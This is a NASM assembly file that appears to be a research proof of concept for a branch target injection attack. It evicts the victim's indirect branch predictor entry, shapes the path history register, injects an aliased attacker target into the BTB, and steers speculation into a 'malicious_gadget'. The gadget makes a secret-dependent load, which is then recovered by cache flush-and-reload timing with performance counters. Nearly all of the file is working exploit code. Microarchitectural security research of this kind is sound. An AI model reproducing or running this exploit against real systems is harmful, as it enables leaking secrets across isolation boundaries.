%include "./SET_VICTIM_PHR0.nasm"
%include "./SET_VICTIM_PHR1.nasm"
%include "./SET_ATTACKER_PHR0.nasm"
%include "./SET_ATTACKER_PHR1.nasm"

%define nthreads 1
%define repeat0  5
%define repeat1  repeat1_input
%define repeat2  1
%define noptype  2

%macro testinitc 0  ; initialization
    mov dword[PrintCustomPMC], 1
    call malicious_gadget ; cache the malicious instructions
%endmacro

%macro testinit3 0
    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    call victim_ibranch 
    xor qword[UserData], 1
    mfence
    call victim_ibranch 
%endmacro

%macro testcode 0   ; main test

    ; evict the victim from the IBP
    %rep 5 * evict_ibp
        rdrand rdx
        and rdx, 1
        mov qword[UserData+8], rdx
        mfence
        call attacker_evict
        SERIALIZE
        xor qword[UserData+8], 1
        mfence
        call attacker_evict
        SERIALIZE
    %endrep

    ; inject the malicious target into the BTB entry
    %rep 20 * inject_btb
        mov rax, sec_attacker_ibranch_addr
        call rax 
    %endrep

    ; flush
    %assign i 0
    %rep 10
     %assign addr_offset 2048+i*512
     clflush [UserData+%+ addr_offset]
    %assign i i+1
    %endrep

    ; execute the victim ibranch
    rdrand rdx
    and rdx, 1
    mov qword[UserData], rdx
    mfence
    call victim_ibranch 
    

    ; reload and measure
    READ_PMC_START
    %assign addr_offset 2048+index*512
    mov rax, [UserData+%+ addr_offset]
    READ_PMC_END

%endmacro

%macro SHIFT_PHR 2  ; the macro code to left-shift the phr
    mov rax, %1
    jmp shift_phr%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr%+ %2
%endmacro


SECTION .sec_attacker_ibranch exec
attacker_ibranch:
    %rep 143
     nop
    %endrep
    lea r10, [inject_t]
    jmp r10
    %rep 64 
     nop
    %endrep

SECTION .sec_inject_target exec
    %rep 33
     nop
    %endrep
inject_t:   ; aliased with the malicious target in victim in the lowest 32 bits
    %rep 64
     nop
    %endrep
    ret

SECTION .sec_attacker_evict exec
attacker_evict:
    %assign i 10
    %rep 6*evict_ibp
        mov rdx, qword[UserData+8]
        lea r10, [attacker_target_0_%+ i]
        lea r9, [attacker_target_1_%+ i]
        cmp rdx, 1
        cmovz r10, r9
        mfence

        cmp rdx, 1
        je attacker_set_PHR1_start_%+ i
        SHIFT_PHR 195,i
        %rep 23
         nop
        %endrep
        SET_ATTACKER_PHR0 i

    attacker_set_PHR1_start_%+ i:
        %assign j i+10
        SHIFT_PHR 195,j
        %rep 23
         nop
        %endrep
        SET_ATTACKER_PHR1 i
    attacker_set_PHR1_end_%+ i:

        %rep i<<6
         nop
        %endrep
        jmp r10
        %rep 64 
         nop
        %endrep
    attacker_target_0_%+ i:
        %rep 64
         nop
        %endrep
    attacker_target_1_%+ i:
        %rep 64
         nop
        %endrep
    %assign i i+1
    %endrep
    ret

SECTION .sec_victim_ibranch exec
victim_ibranch:
    mov rdx, qword[UserData] ; read the input
    lea r10, [victim_target_0]
    lea r9, [victim_target_1]
    cmp rdx, 1
    cmovz r10, r9
    mov qword[UserData+128], r10  ; store the target (target0 if input is 0, target1 if input is 1)
    clflush [UserData+128]    ; flush the target to create a larger speculative window
    mfence
    
    ; set PHR: PHR_0 is correlated with 0, PHR_1 is correlated with 1
    cmp rdx, 1
    je victim_set_PHR1_start
    SHIFT_PHR 195,0
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR0 0

victim_set_PHR1_start:
    SHIFT_PHR 195,1
    %rep 23
     nop
    %endrep
    SET_VICTIM_PHR1 0
victim_set_PHR1_end:
    
    %rep (50)<<6
     nop
    %endrep
    jmp [UserData+128]    ; the victim indirect branch
    %rep 64
     nop
    %endrep
victim_target_0:
    %rep 64
     nop
    %endrep
    ret
victim_target_1:
    %rep 64
     nop
    %endrep
    ret


SECTION .sec_malicious_gadget exec
    %rep 33
     nop
    %endrep
malicious_gadget: ; a malicious gadget will never be reached in the correct control flow
    mov rbx, secret
    shl rbx, 9
    mov rax, [UserData + 2048 + rbx] ; a secret-dependent load
    %rep 64
     nop
    %endrep
    ret